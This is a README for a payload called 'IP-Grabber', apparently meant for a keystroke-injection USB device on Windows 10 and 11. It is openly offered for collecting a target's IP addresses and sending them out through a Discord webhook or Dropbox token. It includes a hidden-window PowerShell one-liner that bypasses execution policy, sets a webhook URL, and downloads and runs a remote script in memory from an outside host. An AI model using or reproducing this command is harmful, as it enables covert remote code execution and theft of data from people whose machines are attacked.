<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# IP-Grabber

## Description

This payload is meant to do grab your targets IP addresses and exfil them with discord or dropbox

## Getting Started

### Dependencies

* Windows 10,11

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory

`$dc` is the variable that stores your Discord webhook 

`$db` is the variable that stores your Dropbox token 

Fill in either or both of these to methods to exfil your collected data

```
powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1092996374183813211/Ug1p0cHdytWWGCq7iVR7-JOawkHT0_mLZazlmjM1DSkbLSZA0MumO4xKCmdMX9gc4cez';irm jakoby.lol/f0x | iex
```

<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

* 0.1
    * Initial Release

<p align="right">(<a href="#top">back to top</a>)</p>



<p align="right">(<a href="#top">back to top</a>)</p>
